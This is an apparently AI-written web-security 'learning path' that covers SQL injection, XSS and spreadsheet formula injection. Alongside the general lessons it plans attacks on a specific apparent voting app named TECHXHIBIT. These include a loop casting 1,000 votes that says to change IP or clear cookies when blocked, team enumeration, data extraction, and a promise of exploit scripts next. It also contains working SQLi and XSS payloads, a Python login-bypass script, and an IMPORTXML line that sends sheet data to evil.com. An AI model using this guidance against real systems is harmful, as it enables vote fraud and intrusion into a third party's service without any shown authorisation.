# Web Application Security - Learning Path & Exploitation Guide

## 🎓 Educational Purpose Only
**Remember:** Only test systems you own or have written permission to test.

---

## 📚 Part 1: Understanding the Vulnerabilities Found

### 1. Input Validation Failure (TECHXHIBIT)

**What We Found:**
```
Normal:   action=getTeams  → Returns JSON
Injected: action=getTeams' → Returns HTML error page
```

**Why This Matters:**
- The server doesn't validate the `action` parameter
- Error messages may leak sensitive information
- Attackers can identify weak points

**How It Works:**
```
User Input → Backend Processing → Database/Storage
     ↑                ↑
  NO FILTER      NO SANITIZATION
```

**The Attack Chain:**
1. Send normal request → Note response format
2. Send malicious input → Compare responses
3. Identify differences → Find injection points
4. Craft specific payloads → Exploit vulnerability

---

## 🎯 Part 2: Common Web Vulnerabilities (OWASP Top 10)

### SQL Injection (SQLi)
**What it is:** Injecting SQL commands into application queries

**Example Attack:**
```sql
-- Normal login query:
SELECT * FROM users WHERE username='admin' AND password='pass123'

-- Attacker input: username = admin'--
SELECT * FROM users WHERE username='admin'--' AND password='pass123'
                                          ↑ Everything after is commented out
Result: Bypasses password check!
```

**Types:**
1. **Error-Based** - Trigger errors to reveal database structure
2. **Union-Based** - Combine queries to extract data
3. **Boolean-Based Blind** - Ask true/false questions
4. **Time-Based Blind** - Use delays to confirm injection

**Practice Payloads:**
```sql
' OR 1=1--           # Boolean bypass
' UNION SELECT NULL--   # Union injection
' AND SLEEP(5)--     # Time-based detection
'; DROP TABLE users-- # Dangerous! (Never use on real systems)
```

### Cross-Site Scripting (XSS)
**What it is:** Injecting malicious JavaScript into web pages

**Example:**
```javascript
// Normal: <input value="John">
// Attack: <input value=""><script>alert(document.cookie)</script>">

// Payload types:
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Formula Injection (Google Sheets Specific)
**What it is:** Injecting formulas that execute commands

**Example:**
```
Normal input: John Doe
Attack input: =CMD|' /C calc'!A0
              =IMPORTXML("http://evil.com/log?data="&A1:Z100)
```

---

## 🔧 Part 3: Exploitation Techniques

### Technique 1: Manual Testing

**Step-by-Step Process:**

1. **Reconnaissance**
   - Use browser DevTools (F12)
   - Examine network requests
   - Identify input fields and parameters
   - Note response formats

2. **Input Discovery**
   - Find all user-controlled inputs:
     - URL parameters (?id=123)
     - Form fields (username, email)
     - HTTP headers (User-Agent, Referer)
     - Cookies

3. **Fuzzing** (Testing with various inputs)
   ```
   Special characters: ' " ; -- # /* */ 
   SQL keywords: SELECT, UNION, OR, AND
   Script tags: <script>, <img>, <svg>
   Commands: |, &, &&, ;, \n
   ```

4. **Exploitation**
   - Start with safe payloads
   - Gradually increase complexity
   - Document what works

### Technique 2: Automated Scanning

**Tools:**
- **SQLMap** - Automated SQL injection
- **Burp Suite** - Web vulnerability scanner
- **OWASP ZAP** - Free security testing
- **Nikto** - Web server scanner

---

## 💻 Part 4: Hands-On Attack Scenarios

### Scenario 1: Bypassing Login (SQL Injection)

**Target:** Login form with username/password

**Attack Process:**
```python
# Normal request
POST /login
username=user&password=pass

# Attack 1: Try to break the query
username=user'&password=pass
→ If you see SQL error: VULNERABLE!

# Attack 2: Boolean bypass
username=admin'--&password=anything
→ If you get logged in: EXPLOITED!

# Attack 3: Extract data
username=admin' UNION SELECT username,password FROM users--&password=x
→ If you see other users' data: CRITICAL!
```

**Python Exploit:**
```python
import requests

url = "https://target.com/login"

# Test payloads
payloads = [
    "admin'--",
    "admin' OR '1'='1'--",
    "admin' UNION SELECT NULL,NULL--"
]

for payload in payloads:
    data = {"username": payload, "password": "random"}
    r = requests.post(url, data=data)
    
    if "Welcome" in r.text or r.status_code == 302:
        print(f"[+] SUCCESS with: {payload}")
        break
```

### Scenario 2: Extracting Data (TECHXHIBIT Attack)

**What we found:** The voting system accepts any teamId

**Exploitation Steps:**

1. **Enumerate Team IDs**
   ```python
   # Try different team IDs to find valid ones
   for i in range(1, 100):
       team_id = f"S{i}"
       # Send vote request
       # Check if team exists
   ```

2. **Vote Manipulation**
   ```python
   # Vote multiple times (if no rate limiting)
   for i in range(1000):
       vote_for_team("S19")
       # Change IP or clear cookies if blocked
   ```

3. **Data Extraction**
   ```python
   # Extract all teams
   response = requests.get(api_url, params={"action": "getTeams"})
   teams = response.json()["teams"]
   
   # Save to file
   with open("teams.json", "w") as f:
       json.dump(teams, f, indent=2)
   ```

---

## 🛡️ Part 5: Learning Resources

### Practice Platforms (Legal & Safe)
1. **DVWA** (Damn Vulnerable Web Application)
   - Download & run locally
   - Multiple difficulty levels
   - Covers all OWASP Top 10

2. **WebGoat** (OWASP)
   - Interactive tutorials
   - Step-by-step guidance

3. **HackTheBox** (hackthebox.eu)
   - Real-world pentesting challenges
   - Active community

4. **PortSwigger Web Security Academy** (FREE!)
   - Excellent labs
   - Video tutorials
   - Certification available

5. **TryHackMe** (tryhackme.com)
   - Beginner-friendly
   - Guided learning paths

### Books
1. "The Web Application Hacker's Handbook" - Stuttard & Pinto
2. "Web Hacking 101" - Peter Yaworski
3. "Bug Bounty Bootcamp" - Vickie Li

### Video Courses
1. **Udemy:** "The Complete Ethical Hacking Course"
2. **YouTube:** 
   - John Hammond
   - IppSec (HackTheBox walkthroughs)
   - LiveOverflow

### Certifications
1. **CEH** (Certified Ethical Hacker)
2. **OSCP** (Offensive Security Certified Professional)
3. **BSCP** (Burp Suite Certified Practitioner)

---

## ⚖️ Part 6: Legal & Ethical Guidelines

### What's LEGAL:
✅ Testing your own applications
✅ Testing with written permission
✅ Bug bounty programs (HackerOne, Bugcrowd)
✅ Practice on intentionally vulnerable apps
✅ Capture The Flag (CTF) competitions

### What's ILLEGAL:
❌ Testing systems without permission
❌ Accessing others' data
❌ Causing damage or disruption
❌ Selling exploits to criminals
❌ Using exploits for personal gain

### Responsible Disclosure:
1. Find vulnerability
2. Document it thoroughly
3. Contact the organization privately
4. Give them time to fix (typically 90 days)
5. Optionally publish after fix

---

## 🎮 Part 7: Setting Up Your Lab

### Requirements:
- VirtualBox or VMware
- Kali Linux (pentesting OS)
- Vulnerable web apps (DVWA, WebGoat)

### Quick Setup:
```bash
# Install VirtualBox
# Download Kali Linux ISO
# Create VM with Kali Linux

# Inside Kali:
sudo apt update
sudo apt install -y sqlmap burpsuite zaproxy nikto

# Download DVWA
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker-compose up
# Access at: http://localhost
```

---

## 🚀 Part 8: Your Learning Roadmap

### Month 1: Fundamentals
- Learn HTTP/HTTPS protocols
- Understand how web apps work
- Practice with browser DevTools
- Complete DVWA "Low" difficulty

### Month 2: Common Vulnerabilities
- Deep dive into SQL injection
- Learn XSS (all types)
- Practice CSRF attacks
- Complete DVWA "Medium" difficulty

### Month 3: Tools & Automation
- Master Burp Suite
- Learn SQLMap
- Write Python exploit scripts
- Join HackTheBox (free tier)

### Month 4-6: Advanced Topics
- API security testing
- Authentication bypass techniques
- Session management attacks
- Attempt OSCP/CEH certification

---

## 🔍 Quick Reference: Testing Checklist

### For Any Web App:

**Step 1: Information Gathering**
- [ ] Identify all input fields
- [ ] Check URL parameters
- [ ] Examine cookies
- [ ] Review JavaScript files
- [ ] Check for hidden fields

**Step 2: Vulnerability Testing**
- [ ] SQL Injection (', ", --)
- [ ] XSS (<script>, <img>)
- [ ] Command Injection (|, ;, &)
- [ ] Path Traversal (../, ..\)
- [ ] Authentication bypass

**Step 3: Documentation**
- [ ] Screenshot everything
- [ ] Save requests/responses
- [ ] Note payload used
- [ ] Describe impact
- [ ] Suggest fix

---

## 💡 Pro Tips

1. **Always get permission** - Can't stress this enough
2. **Start simple** - Don't jump to complex exploits
3. **Read error messages** - They tell you what went wrong
4. **Use proxies** - Burp Suite intercepts all traffic
5. **Learn by doing** - Theory < Practice
6. **Join communities** - Reddit: r/netsec, r/AskNetsec
7. **Document everything** - Keep a security journal
8. **Stay updated** - Follow @pentest on Twitter

---

## 🎯 Next Steps for TECHXHIBIT

### Vulnerabilities to Test:

1. **Vote Manipulation**
   - Can you vote multiple times?
   - Rate limiting?
   - Cookie/localStorage checks?

2. **Registration Form Injection**
   - Test formula injection in name fields
   - Try XSS in team names
   - Check email validation

3. **API Enumeration**
   - Are there hidden API actions?
   - Can you access other teams' data?
   - IDOR (Insecure Direct Object Reference)?

I'll create practical exploit scripts next...
